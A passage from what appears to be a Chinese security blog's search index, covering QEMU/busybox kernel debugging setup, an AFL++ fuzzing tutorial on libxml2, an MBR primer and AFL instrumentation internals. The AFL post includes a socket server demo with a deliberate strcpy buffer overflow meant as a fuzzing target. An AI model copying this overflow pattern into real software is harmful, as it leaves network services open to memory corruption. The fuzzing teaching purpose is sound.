这里不建议使用源码编译的方式进行安装，个人建议是节省时间在核心工作上，工具越快搭建好越能提升效率。源码编译涉及到编译器和主机环境各异性的问题，中间可能出现各种情况，浪费时间。（注意，安装好后，无法直接qemu无法运行，需要使用qemu-system-i386, qemu-system-x86_64, qemu-system-arm这种格式的命令进行运行。如果嫌麻烦，可以设置软链接。） 安装busybox，直接busybox的github上拖源码下来即可。在实际进行文件系统制作的时候再进行其他操作。 最后是下载想进行编译的Linux内核源码，这里给出一个各个版本的Linux内核源码集合。 ","date":"2020-12-24","objectID":"/2020/12/qemu/:2:2","tags":["Linux"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Misc"],"content":"编译调试版内核 ","date":"2020-12-24","objectID":"/2020/12/qemu/:3:0","tags":["Linux"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Misc"],"content":"编译正常流程 首先对Linux内核进行编译： cd linux-3.18.6 make menuconfig make bzImage 注意，这里在进入menuconfig后，需要开启内核参数CONFIG_DEBUG_INFO和CONFIG_GDB_SCRIPTS。gdb提供了python接口进行功能扩展，内核基于python接口实现了一系列辅助脚本来简化内核的调试过程。 Kernel hacking ---\u003e [*] Kernel debugging Compile-time checks and compiler options ---\u003e [*] Compile the kernel with debug info [*] Provide GDB scripts for kernel debuggin ","date":"2020-12-24","objectID":"/2020/12/qemu/:3:1","tags":["Linux"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Misc"],"content":"编译可能遇到的问题 执行make bzImage时遇到的问题： fatal error: linux/compiler-gcc7.h: No such file or directory 提示缺少compiler-gcc7.h这个文件，是由于内核版本较低和gcc版本不匹配造成的有三种解决方法： 1.在内核文件夹中include/linux目录下找到compiler-gcc4.h文件，不同内核版本可能不一样，也有可能是compiler-gcc3.h,将它重命名为compiler-gcc7.h。然后重新编译一下就好了。 2.在新的内核源码中拷贝一个compiler-gcc7.h，将它拷贝到内核文件夹include/linux目录下，重新编译即可。 3.重装一个版本低一点的gcc。 fatal error: asm/types.h: No such file or directory linux添加到asm-generic的软链接: ln -s /usr/include/asm-generic asm ","date":"2020-12-24","objectID":"/2020/12/qemu/:3:2","tags":["Linux"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Misc"],"content":"制作initramfs根文件系统 Linux启动阶段，boot loader加载完内核文件vmlinuz之后，便开始挂载磁盘根文件系统。挂载操作需要磁盘驱动，所以挂载前要先加载驱动。但是驱动位于/lib/modules，不挂载磁盘就访问不到，形成了一个死循环。initramfs根文件系统就可以解决这个问题，其中包含必要的设备驱动和工具，boot loader会加载initramfs到内存中，内核将其挂载到根目录，然后运行/init初始化脚本，去挂载真正的磁盘根文件系统。 ","date":"2020-12-24","objectID":"/2020/12/qemu/:4:0","tags":["Linux"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Misc"],"content":"编译busybox 首先需要注意，busybox默认编译的文件系统是和主机OS一样的位数，也就是Ubuntu是x86的，编译出的文件系统就是x86的，如果Ubuntu是x64的，编译出的文件系统是x64的。要保持前面编译的Linux内核和文件系统的位数一样。 cd busybox-1.32.0 make menuconfig make -j 20 make install 进入menu后，修改参数如下： 其次，修改为静态链接： Settings ---\u003e [*] Build static binary (no shared libs) 然后再执行make和install操作。 ","date":"2020-12-24","objectID":"/2020/12/qemu/:4:1","tags":["Linux"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Misc"],"content":"创建initramfs 编译成功后，会生成_install目录，其内容如下： $ ls _install bin linuxrc sbin usr 依次执行如下命令： mkdir initramfs cd initramfs cp ../_install/* -rf ./ mkdir dev proc sys sudo cp -a /dev/{null, console, tty, tty1, tty2, tty3, tty4} dev/ rm linuxrc vim init chmod a+x init 其中init文件的内容如下： #!/bin/busybox sh mount -t proc none /proc mount -t sysfs none /sys exec /sbin/init 在创建的initramfs中包含busybox可执行程序、必须的设备文件、启动脚本init，且init只挂载了虚拟文件系统procfs和sysfs，没有挂载磁盘根文件系统，所有操作都在内存中进行，不会落地。 最后打包initramfs： find . -print0 | cpio --null -ov --format=newc | gzip -9 \u003e ../initramfs.cpio.gz ","date":"2020-12-24","objectID":"/2020/12/qemu/:4:2","tags":["Linux"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Misc"],"content":"启动内核 qemu-system-i386 -s -kernel /path/to/bzImage -initrd initramfs.cpio.gz -nographic -append \"console=ttyS0\" 参数说明： -s是-gdb tcp::1234缩写，监听1234端口，在GDB中可以通过target remote localhost:1234连接； -kernel指定编译好的调试版内核； -initrd指定制作的initramfs; -nographic取消图形输出窗口； append \"console=ttyS0\"将输出重定向到console，将会显示在标准输出stdio。 启动后的根目录，就是initramfs中包含的内容： 至此，一个简单的内核就算编译完成了，可以挂gdb进行调试了。 ","date":"2020-12-24","objectID":"/2020/12/qemu/:5:0","tags":["Linux"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Fuzz"],"content":"Fuzzing 101 系列 note 5","date":"2020-12-17","objectID":"/2020/12/fuzzing101-5/","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 5","uri":"/2020/12/fuzzing101-5/"},{"categories":["Fuzz"],"content":"本文是Fuzzing101系列第五篇，fuzz的对象为 LibXML2 。 ","date":"2020-12-17","objectID":"/2020/12/fuzzing101-5/:0:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 5","uri":"/2020/12/fuzzing101-5/"},{"categories":["Fuzz"],"content":"1. Basic Info Target CVES to find Time estimated Main topics LibXML2 CVE-2017-9048 3hous measure the code coverage data CVE-2017-13028: Out-of-bounds Read vulneratibily. ","date":"2020-12-17","objectID":"/2020/12/fuzzing101-5/:1:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 5","uri":"/2020/12/fuzzing101-5/"},{"categories":["Fuzz"],"content":"2. Learning Target 在fuzzer中使用自定义词典 使用多个内核并行进行fuzz ","date":"2020-12-17","objectID":"/2020/12/fuzzing101-5/:2:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 5","uri":"/2020/12/fuzzing101-5/"},{"categories":["Fuzz"],"content":"3. Fuzzing ","date":"2020-12-17","objectID":"/2020/12/fuzzing101-5/:3:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 5","uri":"/2020/12/fuzzing101-5/"},{"categories":["Fuzz"],"content":"1. Workflow 找到一个使用LibXML2共享库的应用程序 复制SampleInput.xml文件到AFL的input目录 创建fuzzing XML的常规目录 开始fuzz，直到出现crash 使用造成crash的poc重现crash 修复漏洞 ","date":"2020-12-17","objectID":"/2020/12/fuzzing101-5/:3:1","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 5","uri":"/2020/12/fuzzing101-5/"},{"categories":["Fuzz"],"content":"2. Solution 1. Download and build target 首先创建待fuzz的LibXML2环境，进行编译待用： cd $HOME mkdir Fuzzing_libxml2 \u0026\u0026 cd Fuzzing_libxml2 # download and uncompress the target wget http://xmlsoft.org/download/libxml2-2.9.4.tar.gz tar xvf libxml2-2.9.4.tar.gz \u0026\u0026 cd libxml2-2.9.4/ # build and install libtiff sudo apt-get install python-dev CC=afl-clang-lto CXX=afl-clang-lto++ CFLAGS=\"-fsanitize=address\" CXXFLAGS=\"-fsanitize=address\" LDFLAGS=\"-fsanitize=address\" ./configure --prefix=\"$HOME/Fuzzing_libxml2/libxml2-2.9.4/install\" --disable-shared --without-debug --without-ftp --without-http --without-legacy --without-python LIBS='-ldl' make -j$(nproc) make install # test the target program ./xmllint --memory ./test/wml.xml 以上安装不报错的话，可以正常调用LibXML库 ： 注意一下上面的warning，有提示如果出现AFL++崩溃的情况，可以考虑讲AFL_MAP_SIZE的大小设置为146056. 2. Seed corpus creation 这里直接使用SampleInput.xml做为XML的样例： \u003c!DOCTYPE a []\u003e 3. Custom dictionary 这里直接使用AFL++提供的XML的dict： mkdir dictionaries \u0026\u0026 cd dictionaries wget https://github.com/AFLplusplus/AFLplusplus/blob/stable/dictionaries/xml.dict cd .. 4. Fuzzing 执行 afl-fuzz ，采用并行方式进行fuzz: afl-fuzz -m none -i ./afl_in -o afl_out -s 123 -x ./dictionaries/xml.dict -M master -- ./xmllint --memory --noenc --nocdata --dtdattr --loaddtd --valid --xinclude @@ afl-fuzz -m none -i ./afl_in -o afl_out -s 234 -x ./dictionaries/xml.dict -S slave1 -- ./xmllint --memory --noenc --nocdata --dtdattr --loaddtd --valid --xinclude @@ ","date":"2020-12-17","objectID":"/2020/12/fuzzing101-5/:3:2","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 5","uri":"/2020/12/fuzzing101-5/"},{"categories":["Fuzz"],"content":"3. Crashes 最终没有跑出来crash（肯定是哪里出了问题）： ","date":"2020-12-17","objectID":"/2020/12/fuzzing101-5/:3:3","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 5","uri":"/2020/12/fuzzing101-5/"},{"categories":["Fuzz"],"content":"4. Triage 这里直接使用的是教程里的： ./xmllint --memory --noenc --nocdata --dtdattr --loaddtd --valid --xinclude './afl_out/default/crashes/id:000000,sig:06,src:003963,time:12456489,op:havoc,rep:4' ","date":"2020-12-17","objectID":"/2020/12/fuzzing101-5/:4:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 5","uri":"/2020/12/fuzzing101-5/"},{"categories":["Fuzz"],"content":"5. Fix 官方的修复地址： https://github.com/GNOME/libxml2/commit/932cc9896ab41475d4aa429c27d9afd175959d74 后续将对该漏洞进行深入分析和补丁分析，待完善。 ","date":"2020-12-17","objectID":"/2020/12/fuzzing101-5/:5:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 5","uri":"/2020/12/fuzzing101-5/"},{"categories":["Misc"],"content":"MBR简介","date":"2020-12-14","objectID":"/2020/12/mbr/","tags":["Linux"],"title":"MBR简介","uri":"/2020/12/mbr/"},{"categories":["Misc"],"content":"MBR简介 ","date":"2020-12-14","objectID":"/2020/12/mbr/:0:0","tags":["Linux"],"title":"MBR简介","uri":"/2020/12/mbr/"},{"categories":["Misc"],"content":"一、磁盘结构 ","date":"2020-12-14","objectID":"/2020/12/mbr/:1:0","tags":["Linux"],"title":"MBR简介","uri":"/2020/12/mbr/"},{"categories":["Misc"],"content":"1、磁盘的物理结构 磁盘结构可分为外部结构和内部结构，外部结构主要包括金属固定面板、控制电路板和接口三部分： 其中控制电路板部分包括了主轴调速电路、磁头驱动与伺服定位电路、读写电路、控制与接口电路等，几个主要的芯片：主控芯片、BIOS芯片、缓存芯片、电机驱动芯片；接口部分则一般有几个不同的硬盘接口，主要包括电源插座接口、数据接口和主从跳线接口（设置主、从硬盘，即磁盘驱动器的访问顺序）。 磁盘的内部结构如下： 内部结构则主要有以下几个核心部件： 1. 磁头组件 包括读写磁头、传动手臂、传动轴三部分，最重要的是磁头。传动轴带动传动比，使磁头到达指定位置。磁头是用线圈缠绕在磁芯上制成的，工作原理是利用特殊材料的电阻值会随着磁场变化的原理来读写盘片上的数据。硬盘在工作时，磁头通过感应旋转的盘片上磁场的变化来读取数据；通过改变盘片上的磁场来写入数据。为避免磁头和盘片的磨损，在工作状态时，磁头悬浮在高速转动的盘片上方，间隙只有0.1~0.3um，而不是盘片直接接触，在电源关闭之后，磁头会自动回到在盘片上着陆区，此处盘片并不存储数据，是盘片的起始位置。 2. 磁头驱动组件 磁头的移动是靠磁头驱动组件实现的，硬盘寻道时间的长短与磁头驱动组件关系非常密切。 3. 盘片与主轴组件 盘片是硬盘存储数据的载体，主要是在铝合金或玻璃基底上涂覆很薄的磁性材料、保护材料和润滑材料等多种不同作用的材料层加工而成，其中磁性材料的物理性能和磁层结构直接影响了数据的存储密度和所存储数据的稳定性。玻璃盘片比金属盘片在运行时具有更好的稳定性。 4. 前置控制电路 前置放大电路控制磁头感应的信号、主轴电机调速、磁头驱动和伺服定位等，由于磁头读取的信号微弱，将放大电路密封在腔体内可减少外来信号的干扰，提高操作指令的准确性。 ","date":"2020-12-14","objectID":"/2020/12/mbr/:1:1","tags":["Linux"],"title":"MBR简介","uri":"/2020/12/mbr/"},{"categories":["Misc"],"content":"2、逻辑结构 磁盘在使用前需要先进行格式化，该过程主要是在逻辑上为每个盘片划分磁道、扇区、柱面等这几个虚拟概念。下图为磁盘的逻辑结构： 磁道 当磁盘旋转时，磁头若保持在一个位置上，则每个磁头都会在磁盘表面划出一个圆形轨迹，该轨迹就称为磁道。磁道是一个个同心圆，通常盘面的一面有成千上万个磁道，磁盘上的信息是沿着轨道进行存放，相邻的磁道间保持一定距离，避免磁化单元相近时会互相影响，也为磁头进行数据读写时降低难度。 扇区 每个盘片的每一面都会划分很多同心圆的磁道，而且还会将每个同心圆进一步分割为多个相等的圆弧，这些圆弧就是扇区（也称扇面）。数据则以扇区为单位进行存储，扇区也是磁盘I/O操作的最小单位（即使只需要某个扇区的几个字节，计算机也必须一次性将整个扇区的全部512字节读入内存，然后再进行数据筛选。）。扇区通常包含标题、数据、ECC(Error Correcting Code)纠错信息，其中标题包含同步和位置信息，ECC功用是对数据段提供错误侦测和纠正。 柱面 硬盘通常由一个或多个盘片构成，而且每个面都被划分为数目相等的磁道，并从外缘开始编号（即最边缘的磁道为0磁道，往里依次累加）。如此磁盘中具有相同编号的磁道会形成一个圆柱，此圆柱称为磁盘的柱面。磁盘的柱面数与一个盘面上的磁道数是相等的。由于每个盘面都有一个磁头，因此，盘面数等于总的磁头数。 对磁盘进行分区的主要目的是为了不同类的目录与文件可以存储进不同的分区，越多分区，也就有更多不同的地方，可以将文件的性质区分得更细，按照更为细分的性质，存储在不同的地方以管理文件。总结下分区的优点： 优化I/O性能 实现磁盘空间配额限制 提高修复速度 隔离系统和程序 安装多个OS 采用不用的文件系统 磁盘结构的3D参数：CHS，C-Cylinder，柱面；H-Head，磁头；S-Sector，扇区。 最后是磁盘的容量 = 柱面数 * 磁头数 * 扇区数 * 512Bytes ，相关的编号方式是：磁道从外到内编号，最外层是0号磁道；扇区的编号为固定标记某块为1号，然后顺时针编号；磁头则是决定读写面号的结构，从0开始顺序编号。 在老式磁盘中，虽然磁道周长不同，但是每个磁道上的扇区数是相同的，越往圆心扇区弧段越短，但其存储密度越高。这种方式显而易见，很浪费空间，所以现代磁盘修改为等密度结构，这也就是说，外围磁道上的扇区数要大于内圈磁道的扇区数，寻址方式上也改为以扇区为单位的线性寻址。 ","date":"2020-12-14","objectID":"/2020/12/mbr/:1:2","tags":["Linux"],"title":"MBR简介","uri":"/2020/12/mbr/"},{"categories":["Misc"],"content":"二、MBR 磁盘有2种分区方式：MBR和GPT。MBR，全称为Master Boot Record，主引导记录，是指磁盘第1块扇区上的一种数据结构。它在磁盘上的三维地址（柱面，磁头，扇区） = （0，0，1）。这里需要注意，在讨论引导扇区内部结构的时候，有时指的其开头的446字节内容，其后4个16字节的数据是磁盘分区表（DPT），以及2字节的结束标志“55AA”。 ","date":"2020-12-14","objectID":"/2020/12/mbr/:2:0","tags":["Linux"],"title":"MBR简介","uri":"/2020/12/mbr/"},{"categories":["Misc"],"content":"1. MBR结构 MBR记录了磁盘本身的相关信息以及磁盘各个分区的大小及位置信息。MBR内的信息可以通过任何一种基于某种操作系统的分区工具软件写入，和OS没有特定关系，即只要创建了有效的MBR就可以引导某一种OS（因为OS是创建在高级格式化的磁盘分区上的，是和一定的文件系统相关联的）。 一个标准的MBR结构如下： 首先使用dd if=/dev/sda of=mbr.bin bs=1 count=512命令将mbr中的数据导出成mbr.bin后，然后使用hexdump查看bin文件中的数据： 后续将对该文件中的各个部分的数据做详细解读。 ","date":"2020-12-14","objectID":"/2020/12/mbr/:2:1","tags":["Linux"],"title":"MBR简介","uri":"/2020/12/mbr/"},{"categories":["Misc"],"content":"2. MBR与磁盘分区 MBR的分区方式为4个主分区或3个主分区+1个扩展（N个逻辑分区）。MBR磁盘分区的结构示意图如下： 因为MBR仅仅包含一个64字节大小的DPT，而每个分区需要16字节，所对于采用MBR型分区的磁盘最多只能识别4个主要分区（Primary partition）。如果想获得4个以上的主要分区，就需要使用扩展分区，扩展分区也是主分区的一种，不同点是扩展分区可以在理论上划分成无数个逻辑分区。 扩展分区，它仅仅是一个指向下一个分区的指针，逻辑驱动器的引导记录是链式的。每一个逻辑分区都有一个和MBR结构类似的扩展引导记录（EBR），其分区表的第一项指向该逻辑分区本身的引导扇区，第二项指向下一个逻辑驱动器的EBR，分区表第三、第四项没有用到。 Windows系统默认情况下，一般都是只划分一个主分区给系统，剩余的部分全部划入扩展分区。这里有下面几点需要注意： 在MBR分区表中最多4个主分区或者3个主分区＋1个扩展分区，也就是说扩展分区只能有一个，然后可以再细分为多个逻辑分区。 在Linux系统中，磁盘分区命名为sda1－sda4或者hda1－hda4（其中a表示磁盘编号可能是a、b、c等等）。在MBR磁盘中，分区号1－4是主分区（或者扩展分区），逻辑分区号只能从5开始。 在MBR分区表中，一个分区最大的容量为2T，且每个分区的起始柱面必须在这个disk的前2T内。你有一个3T的磁盘，根据要求你至少要把它划分为2个分区，且最后一个分区的起始扇区要位于磁盘的前2T空间内。如果磁盘太大则必须改用GPT。 ","date":"2020-12-14","objectID":"/2020/12/mbr/:2:2","tags":["Linux"],"title":"MBR简介","uri":"/2020/12/mbr/"},{"categories":["Misc"],"content":"3. MBR组成 1. 启动代码 MBR最开头是第一阶段引导代码，其中的磁盘引导程序的主要作用是检查分区表是否正确并且在系统硬件完成自检以后将控制权交给磁盘上的引导程序（如grub）。它不依赖任何操作系统，而且启动代码可以改变，从而实现多系统引导。代码区最大长度为446字节。 2. 磁盘分区表 大小为64字节，偏移01be-01fd，对四个分区的信息进行描述，其中每个分区的信息占16个字节。一个详细的磁盘分区结构各字节含义表如下： 例如，某一分区在磁盘分区表的信息如下： 80 01 01 00 0B FE BF FC 3F 00 00 00 7E 86 BB 00 首字节80为分区的激活标志，表示为活动分区，可被系统引导；01 01 00表示分区开始的磁头号为1，扇区好为1，柱面号为0；0b表示分区的系统类型为FAT32，其他比较常用的有04（FAT16）、07（NTFS）；fe bf fc表示分区结束的磁头号为254，分区结束的扇区号为63，分区结束的柱面号为764；3f 00 00 00表示首扇区的相对扇区号为63（小端）；7e 86 bb 00表示总扇区数为12289662（小端）。 （这里需要注意，对于大于8.4G的现代磁盘，CHS的方式已经无法表示，BIOS使用LBA模式，对于超出的部分，CHS值通常设定为0xfeffff，并加以忽略，直接使用偏移0x08-0x0c的4字节相对值，再进行内部转换。） 3. 结束标志字 55 AA，偏移1feh-1ffh，最后2个字节，是检验MBR是否有效的标志。 ","date":"2020-12-14","objectID":"/2020/12/mbr/:2:3","tags":["Linux"],"title":"MBR简介","uri":"/2020/12/mbr/"},{"categories":["Misc"],"content":"4. 主引导扇区的读取流程 系统开机或者重启。 BIOS上电自检（Power On Self Test – POST）。BIOS执行内存地址为FFFF:0000H处的跳转指令，跳转到固化在ROM中的自检程序处，对系统硬件（包括内存）进行检查。 读取主引导记录（MBR）。当BIOS检查到硬件正常并与CMOS中的设置相符后，按照CMOS中对启动设备的设置顺序检测可用的启动设备。BIOS将相应启动设备的第一个扇区（也就是MBR扇区）读入内存地址为0000:7C00H处。 检查0000:7DFEH-0000:7DFFH（MBR的结束标志位）是否等于55AAH，若不等于则转去尝试其他启动设备，如果没有启动设备满足要求则显示\"NO ROM BASIC\"然后死机。 当检测到有启动设备满足要求后，BIOS将控制权交给相应启动设备。启动设备的MBR将自己复制到0000:0600H处，然后继续执行。 根据MBR中的引导代码启动引导程序。 事实上，BIOS不仅检查0000:7DFEH-0000:7DFFH（MBR的结束标志位）是否等于55AAH，往往还对磁盘是否有写保护、主引导扇区中是否存在活动分区等进行检查。如果发现磁盘有写保护，则显示磁盘写保护出错信息；如果发现磁盘中不存在活动分区，则显示类似如下的信息“Remove disk or other media Press any key to restart”。 ","date":"2020-12-14","objectID":"/2020/12/mbr/:2:4","tags":["Linux"],"title":"MBR简介","uri":"/2020/12/mbr/"},{"categories":["Fuzz"],"content":"AFL二三事系列 note 2","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"本文是AFL系列第二篇，主要介绍AFL的一些基本原理。 ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:0:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"一、代码覆盖率 ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:1:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"1. 计算方法 代码覆盖率的计量单位，通常有3种： 函数（Fuction-Level） 基本块（BasicBlock-Level） 边界（Edge-Level） （1）函数（Fuction-Level） 这个很容易理解，就是代码执行时调用到哪些函数，但是函数里面的具体代码行却不作统计，相对比较粗糙但高效的统计方式。 所以，通常的统计方式是用基本块，简称BB。 （2）基本块（BasicBlock-Level） 基本块，直接看下图就很容易理解了。 IDA中每一块代码就代表着一个基本块，就是以指令跳转为作划分界限的。 （3）边界（Edge-Level） edge本身就涵盖了基本块部分，唯一的差别是edge多记录了一些执行边界的信息。比如示例代码： 在IDA中可以看到A、B、C这3个基本块，但当a为假时，程序就会从A执行到C。 前面基本块的方式就无法确切地知道是否曾从A执行到C，尤其是该段代码被多次执行的情况，就更无法知道，这时edge覆盖方式就出现了。 edge会在A跟C之间建立虚拟块D，通过判断D是否执行过，来确认是否曾从A执行到C，这种方式也会比较消耗性能。 以上内容摘自泉哥博客，原文链接https://riusksk.me/2018/07/29/honggfuzz%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF1/ AFL采用的是第三种方式。 ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:1:1","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"2. AFL中两种代码覆盖率计算方式 AFL支持两种代码覆盖率计算方式，有源码的情况下，在源代码编译时进行插桩，无源码的情况下，使用QEMU进行二进制插桩。下一章节会分别详细讲解这两种情况使用的插桩技术。 ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:1:2","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"二、插桩 ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:2:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"1. 有源码 我们以如下代码为例进行说明，文件名为 socket.c #include\u003cstdio.h\u003e #include\u003cstdlib.h\u003e #include\u003cstring.h\u003e #include\u003cunistd.h\u003e #include\u003csys/socket.h\u003e #include\u003cnetinet/in.h\u003e #define SERV_PORT 8000 #define SIZE 100 #define MAXLINE 64 int command(char* buf) { char recv[32]; memset(recv, 32, 0); strcpy(recv, buf + 8); return 0; } int main() { struct sockaddr_in servaddr,cliaddr; socklen_t cliaddr_len; int listenfd,connfd; char buf[MAXLINE]; int i,n,flag = 0; listenfd = socket(AF_INET,SOCK_STREAM,0); bzero(\u0026servaddr,sizeof(servaddr)); servaddr.sin_family = AF_INET; servaddr.sin_addr.s_addr = htonl(INADDR_ANY); servaddr.sin_port = htons(SERV_PORT); bind(listenfd,(struct sockaddr *)\u0026servaddr,sizeof(servaddr)); listen(listenfd,20); printf(\"Accepting connections..\\n\"); cliaddr_len = sizeof(cliaddr); connfd = accept(listenfd,(struct sockaddr *)\u0026cliaddr,\u0026cliaddr_len); char send_msg[MAXLINE*2] = \"hello, send by send() :\\n\"; send(connfd, send_msg, strlen(send_msg), 0); n = read(connfd,buf,MAXLINE); if(n!=0){ if(!strncmp(buf, \"test \", 5)) sprintf(send_msg, \"test: %s\\n\", buf + 5); else if(!strncmp(buf, \"help\", 4)) sprintf(send_msg, \"help:\\n\\ttest\\n\\tcommand\\n\\texit\\n\"); else if(!strncmp(buf, \"command \", 8)){ command(buf); sprintf(send_msg, \"it's a command\\n\"); } else if(!strncmp(buf, \"exit\", 4)) send(connfd, \"bye~\\n\", 4, 0); else sprintf(send_msg, \"unknown command!\\n\"); send(connfd, send_msg, strlen(send_msg), 0); } else printf(\"Client say close the connection..\\n\"); close(connfd); } 可以进行源码插桩的指令有 afl-gcc、afl-g++、afl-clang、afl-clang++ ( afl-clang-fast 和 afl-clang-fast++ 暂不讨论)，通过查看这些文件的具体属性，可以发现后三者都是 afl-gcc 的软链接，其实都是同一个二进制文件： 通过分析 afl-gcc.c 中的代码可以发现， afl-gcc 就是在原有的编译指令上增加一些编译选项然后调用对应的系统调用指令： 为了方便查看每次源码编译时的编译选项，可以对 afl-gcc.c 进行修改，在 main() 函数中调用 execvp() 之前添加如下代码，打印出实际执行的编译指令： //print command for(int i = 0; i \u003c cc_par_cnt; i++){ printf(\"%s \", cc_params[i]); } printf(\"\\n\"); 其中数组 cc_params 存放着编译指令和选项，整数 cc_par_cnt 存放数组有效值，修改完成后对AFL重新进行编译即可。 （afl-clang-fast 和 afl-clang-fast++ 对应的源码文件为 llvm_mode/afl-clang-fast.c ，修改方法相同） 使用 afl-gcc 对上面代码进行编译 afl-gcc -o socket_afl socket.c 可以看到实际执行的编译指令为 gcc -o socket socket.c -B /usr/local/lib/afl -g -O3 -funroll-loops -D__AFL_COMPILER=1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1 ，其中 -B \u003cdirectory\u003e 选项用于将添加到编译器的搜索路径，-g 选项生成调试信息，-O3 优化生成代码，-funroll-loops 选项展开循环的迭代次数可以在编译时或进入循环时确定，剩余两个为AFL使用的选项。（gcc的选项可以参考此链接 https://gcc.gnu.org/onlinedocs/gcc-4.4.2/gcc/Optimize-Options.html） 如果了解编译过程，那么就知道把源代码编译成二进制，主要是经过”源代码”-\u003e”汇编代码”-\u003e”二进制”这样的过程。而将汇编代码编译成为二进制的工具，即为汇编器assembler。Linux系统下的常用汇编器是as。不过，编译完成AFL后，在其目录下也会存在一个as文件，并作为符号链接指向afl-as。所以，如果通过-B选项为gcc设置了搜索路径，那么afl-as便会作为汇编器，执行实际的汇编操作。 所以，AFL的代码插桩，就是在将源文件编译为汇编代码后，通过 afl-as 完成。 afl-as 下面通过对比 gcc 和 afl-gcc 的编译结果进行大致分析。 将 afl-gcc 中添加的 -B、-D__AFL_COMPILER=1、DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1 三个选项去掉，调用 gcc gcc -o socket socket.c -g -O3 -funroll-loops 这样就生成了 socket_afl 和 socket 两个文件。 使用 bindiff 对这两个文件中的 main 函数进行对比 上图中右下角部分看起来结构不一样，不过这里是 bindiff 识别bug，多出了一个代码块并且少了一条线，我们可以分别使用 ida 打开这两个文件，查看 main 函数的结构图 这里对 bindiff 误报结果的详细分析就不多说了，这个不是本次的重点。 可以看到 afl 进行源代码插桩时不会改变代码的逻辑结构，也不会增加或减少代码块。 对比看下每个代码块中代码的区别 可以看出，基本每个代码块都被添加了一段相似的汇编代码 在 ida 中将这部分代码拷贝出来，如下： lea rsp, [rsp-98h] mov [rsp+1D0h+var_1D0], rdx mov [rsp+1D0h+var_1C8], rcx mov [rsp+1D0h+var_1C0], n mov rcx, 650Eh call __afl_maybe_log mov n, [rsp+1D0h+var_1C0] mov rcx, [rsp+1D0h+var_1C8] mov rdx, [rsp+1D0h+var_1D0] lea rsp, [rsp+98h] 对比可以发现，不同的代码块只有 mov rcx, 650Eh 这条汇编代码向 rcx 存放的值不同，这个就是随机生成的标识代码块的id，当运行到这部分汇编时 afl 就知道是哪个代码块被执行了。 上述 ida 中的汇编代码原型可以在 afl-as.h 中找到（以64位代码为例）： 上述代码执行的主要功能包括： 保存 rdx、 rcx 、rax 寄存器 将 rcx 的值设置为 fprintf() 函数将要打印的变量内容 调用 __afl_maybe_log 函数 恢复寄存器 在以上的功能中， __afl_maybe_log 是插桩代码所执行的实际内容，后续将详细展开。 可以在 afl-as.c 中查看到该汇编的调用，通过 fprintf() 函数的调用，将格式化字符串添加到汇编文件的相应位置。 这里分析下 R(MAP_SIZE) ，它就是上面汇编代码中将 rcx 设置的值。根据定义， MAP_SIZE 为64K，而对于 R(x) 函数定义如下： 其中 R(MAP_SIZE) 相当于 random() % (1 \u003c\u003c MAP_SIZE_POW2) ，也就是生成随机数，所以标识代码块的id是随机生成的（两次编译生成的代码段id不同）。 上述过程总结起来就是在处理到某个分支需要插入桩代码时， afl-as 会随机生成一个随机数，作为运行时保存在 rcx 中的值。而这个随机数，便是用于标识这个代码块的id。 （备注：因为代码块ID随机的问题，会","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:2:1","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 